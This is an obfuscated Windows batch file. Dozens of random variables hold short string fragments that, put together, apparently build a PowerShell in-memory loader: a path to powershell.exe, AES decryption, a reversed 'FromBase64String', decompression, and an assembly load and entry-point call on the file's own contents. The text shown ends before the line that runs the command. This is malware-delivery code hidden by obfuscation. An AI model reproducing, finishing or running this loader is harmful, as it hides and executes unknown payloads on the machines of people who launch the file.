@echo off
set "TgTnTJqTyQ=ws"
set "scsqZyIHou=\v"
set "RPnzwDIMkr=0\"
set "rumDUEuBab=he"
set "CYjmYNinWq=do"
set "TtgTcTDiQA=32"
set "ahCiBlIMaB=y "
set "TZDLdlFldt=1."
set "eKdZdOPKwh=Wi"
set "WMnFiLKfzA=we"
set "yjbiHaqqKx=xe"
set "RzpWtRddrM=rS"
set "jCNUPSiNDs=co"
set "TDnKWtqQTQ=.e"
set "hphZkxpJNd=st"
set "dmUHIZBLjP=py"
set "pUlxKnGepG=s\"
set "gdIVqFKGAL=:\"
set "FSOYXmrnBh=we"
set "yQOKrLzkAL= /"
set "iJHHweCHqL=ll"
set "vgRWQCPSTv=rs"
set "AHuumZEYrc=ow"
set "kRttRLjQUk=em"
set "XXDHmWcVxu=Po"
set "ziNJtocVEw=po"
set "PVwWULmTrO=he"
set "YWqlwHoKuS=in"
set "LnQCLbrVpH=ll"
set "kAAzVaNmnm=\W"
set "FuoEyzyvzB=nd"
set "zHelDLPdxR=Sy"
set "XJesvorAtj= C"
set "WOPjmBhbhS=cd"
set "WlkdgYWiYl= %~dp0"
set "zbKDWOWVeo= '')"
set "LJwbZldsAb=form"
set "eDGPKWAefa===')"
set "WPCmxXVbjY=ispo"
set "ZALjBrKwGS=.Cry"
set "vvvjTBCzXb=Stre"
set "NRloRBzlOy=O.Me"
set "zyCjCbmtJx=yGsh"
set "ndLmyEfqzy=rtS4"
set "RHgSEhaoKQ=ose("
set "opKvxVGyKw=comp"
set "MHqmaVdVuZ=.IO."
set "ZaeSmkjcwS=Fplh"
set "LICgGLhJVi='dqR"
set "cDldcnqhAo=qxzw"
set "gJrjUHnQkO=Bmor"
set "PfZsAoWPrG=vqxz"
set "XunEsFgXPQ=[Sys"
set "AuPiIJxsPL=ptor"
set "ZQebujACNL=orF'"
set "arHaMFbnzU=em.I"
set "hhEJfOilzo=rity"
set "VYDvaojFaM=-nop"
set "eaFuyBFnHZ=ptog"
set "MsSmAEaqGx=..-1"
set "TDCvvqwMms=fore"
set "LZVvMIQgWq= New"
set "QwSMlUYqIP=rofi"
set "yGXfVOxOaI=]::("
set "PUzmgpRKbF=eam("
set "iIvZyLBqam=ypto"
set "uficmYDEKI=ecry"
set "tyuizrghgD=('l0"
set "BkBZmkXzQh=OyzA"
set "MisvzGvhWy=$vqx"
set "KnMgpjVKHC=ct S"
set "riDuuNPyCK=stem"
set "WFBizsvcvq=h = "
set "ofwzDXMIPb=brea"
set "MfBchVBtvl=6esa"
set "ToaSbzQcyO=trea"
set "ThuaJINDhy=raph"
set "emDipjKhAG=embl"
set "rAxFECTXQe=.Cop"
set "rSBuoxPOfP=:('g"
set "FCiEiQWszE=Aq.T"
set "lEOzkZIvLq=mory"
set "frRfgcmpSs=('%~f0'"
set "MERyBZSdKU=ycbN"
set "NFrKgojtYI=ring"
set "QimOfzpalH=lhP."
set "wNHjwyTHiK=pD ="
set "KrRnOPfAmE=raph"
set "LRLtKBKbwT=-Obj"
set "lnauNrQzou=ke($"
set "gmOqcMUeAV=-1.."
set "heVxsvUMYb=isfL"
set "HepSrrIYfX=hy.A"
set "GiJVspqWsx= '')"
set "UbqJXzmDAr=7Yiv"
set "QPcCYpjQAu=crz."
set "qogLdHrhOH=-joi"
set "EhoiGZsuah=e]::"
set "SwxWKitkgf=UGTu"
set "UxgnsECZAA=[]] "
set "DvvsKqORhd=$ycb"
set "cFqimhMVhL=Fina"
set "fKpxbKpEgO=ew-O"
set "vPYSWoeZGH=rz, "
set "jsckRtIOyF=Disp"
set "fJHFnDkOvu=NoTF"
set "SyyiiVHMWY=yste"
set "lWLOOAqkaR=Fo7l"
set "YVwahjJjYQ=.Dis"
set "aDSwofpuze=vj0m"
set "nticTkejhH=.Mem"
set "WmpQgbJjti=and "
set "YXKJUCEbkj= if "
set "fZfmqqmqHX=);$g"
set "mfXMpEeFek=ytv."
set "dqmAQrzHOL=tem."
set "QEBDRqPpgg=sGUc"
set "nHvadlpRtm=S46e"
set "oWwuutRfzF=[Sys"
set "bygJXQNVbF=bjec"
set "ctwGCEAuna=oryS"
set "NhieLkeCjQ=.Key"
set "xLkCzCAbqn=gytv"
set "YZnNlcSrQV=New-"
set "gPSPheEPsc=ing("
set "HEyWBVvLTU=pD);"
set "ZPkqWQTdFM=[Env"
set "oUfJGBjxjW=pose"
set "NlVhKRtoXd=tion"
set "xaJcdqrtuc= = $"
set "wouHBzePQA=ewLi"
set "aYNXgbKmpv=BC;$"
set "catllDfFJq=sh.D"
set "EkUxiDBMrW=.Mod"
set "jTYlTtWbXP=esMa"
set "YpDvxZWqAk=ment"
set "kwHWgOQKRM=)) {"
set "TvnOEVawEF=;$gg"
set "EEdrDoSRSo=pStr"
set "nYYZyPFkQa=onve"
set "ueNtnAQPEs=F'[-"
set "joOVknfEgN=cbNc"
set "unmsnRJEjI=esaB"
set "DPDOXrUJhH=tS46"
set "assQMeSzAn=[Sys"
set "sVZrAeJZQX=Nc ="
set "yPoPouZSoh=m.Re"
set "WjkaPYdJdT=lBlo"
set "zDhLGKxtGr=$nBc"
set "XKGELLIcLu=TllA"
set "cYdTWQFlaz=Star"
set "RnJTojAqfm=gnir"
set "LqivSMbvxV=;$YJ"
set "fZYiCdGVAL=.Len"
set "pFyltYfDZY= [st"
set "eMPdZCRPZP=n ''"
set "YMeJensbvg=();$"
set "hbsCXsrnGw=tsWi"
set "WaJGjuJLHh=; };"
set "ItLqdSoLSt=v4Ir"
set "TqnzezuljQ=('%*'"
set "nnDmsqsHTF='[-1"
set "AWgwfOHYVD=6] -"
set "BufWpesDIg=d;$v"
set "zPciWPKWEv=th('"
set "zixoEUkEkJ=]::C"
set "zTaQKPoGKC=nBcr"
